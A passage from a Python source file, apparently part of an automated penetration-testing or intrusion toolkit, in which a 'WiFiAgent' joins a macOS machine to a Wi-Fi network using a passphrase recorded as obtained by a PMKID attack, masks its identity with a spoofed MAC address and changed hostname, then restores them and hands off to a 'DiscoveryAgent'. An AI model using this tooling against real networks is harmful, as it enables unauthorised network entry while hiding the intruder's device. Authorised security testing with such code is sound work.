            result = subprocess.run(
                [
                    "networksetup",
                    "-addpreferredwirelessnetworkatindex",
                    interface, ssid, "0", "WPA2", passphrase
                ],
                capture_output=True, text=True, timeout=30
            )

            if result.returncode != 0:
                print(f"[WiFiAgent] networksetup join failed: {result.stderr.strip()}") #NORMAL
                return False

            # Poll for IP assignment instead of a fixed sleep --
            # macOS associates asynchronously so we wait until we
            # actually have an IP or give up after 30 seconds
            deadline = time.time() + 30
            while time.time() < deadline:
                result = subprocess.run(
                    ["ipconfig", "getifaddr", interface],
                    capture_output=True, text=True
                )
                if result.stdout.strip():
                    print(f"[WiFiAgent] Associated, IP: {result.stdout.strip()}") #NORMAL
                    break
                time.sleep(2)
            else:
                print(f"[WiFiAgent] Timed out waiting for IP assignment") #NORMAL
                return False

            return True

        except Exception as e:
            print(f"[WiFiAgent] Join error: {e}") #NORMAL
            return False

        finally:
            # Restore real MAC if we spoofed it
            if original_mac:
                _restore_mac(interface, original_mac)
            # Restore real hostname regardless of outcome
            if original_hostname:
                subprocess.run(["sudo", "scutil", "--set", "ComputerName", original_hostname], capture_output=True)
                subprocess.run(["sudo", "scutil", "--set", "LocalHostName", original_hostname], capture_output=True)
                if VERBOSE: print(f"[WiFiAgent] Hostname restored: {original_hostname}") #VERBOSE


    # -------------------------------------------------------------------------
    # Phase 8 -- populate ctx
    # -------------------------------------------------------------------------

    def _populate_ctx(self, ctx: EngagementContext, ssid: str, passphrase: str):
        ctx.wifi_ssid       = ssid
        ctx.wifi_passphrase = passphrase
        ctx.entry_method    = "wifi_pmkid"

        ctx.log(
            self.name,
            "WiFiAgent complete",
            result=f"ssid={ssid} entry_method=wifi_pmkid"
        )
        print(f"\n[WiFiAgent] Complete -- handing off to DiscoveryAgent") #NORMAL

    